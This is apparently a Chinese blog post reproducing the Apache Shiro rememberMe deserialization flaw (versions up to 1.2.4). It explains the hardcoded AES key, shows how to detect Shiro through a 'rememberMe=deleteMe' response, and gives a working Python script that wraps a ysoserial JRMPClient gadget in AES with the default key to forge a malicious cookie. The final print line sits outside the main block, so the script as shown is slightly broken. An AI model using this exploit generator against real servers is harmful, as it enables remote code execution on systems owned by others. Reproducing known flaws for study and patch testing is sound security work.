## 前言  

前几天听说了一个shiro反序列化漏洞，很陌生，那就复现一下吧。

## 什么是shiro

Apache Shiro是一个强大且易用的Java安全框架,能够用于身份验证、授权、加密和会话管理。Shiro拥有易于理解的API,您可以快速、轻松地获得任何应用程序——从最小的移动应用程序到最大的网络和企业应用程序。嗯，Apache Shiro就是一个很好用的开源安全框架，可以完全处理身份验证，授权，加密和会话管理。

## 漏洞简介：

Apache shiro默认使用CookieRememberMeManager，它处理cookie的流程是  首先得到 rememberMe的cookie，然后将其进行base64解码，然后AES解密，最后再将其反序列化；

因为AES的密码是硬编码的，就导致了攻击者可以构造恶意数据造成反序列化的RCE漏洞。

## 影响版本：

Apache Shiro <= 1.2.4

## 漏洞验证

怎么确定网站是Shiro环境？

burp随便登录登录，响应包中 **rememberMe=deleteMe** 来确认

最后生成的jar包在ysoserial中的target文件夹下，这里使用ysoserial-0.0.6-SNAPSHOT-all.jar包。

我们将它复制到一个新的文件夹里并命名为ysoserial.jar。

然后新的文件夹里新建shiro.py脚本。

```
import sys
import uuid
import base64
import subprocess
from Crypto.Cipher import AES

def encode\_rememberme(command):
    popen = subprocess.Popen(\['java', '-jar', 'ysoserial.jar', 'JRMPClient', command\], stdout\=subprocess.PIPE)
    BS = AES.block\_size
    pad = lambda s: s + ((BS \- len(s) % BS) \* chr(BS \- len(s) % BS)).encode()
    key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE\_CBC, iv)
    file\_body = pad(popen.stdout.read())
    base64\_ciphertext = base64.b64encode(iv + encryptor.encrypt(file\_body))
    return base64\_ciphertext

if \_\_name\_\_ == '\_\_main\_\_':
    payload = encode\_rememberme(sys.argv\[1\])    
print "rememberMe={0}".format(payload.decode())
```
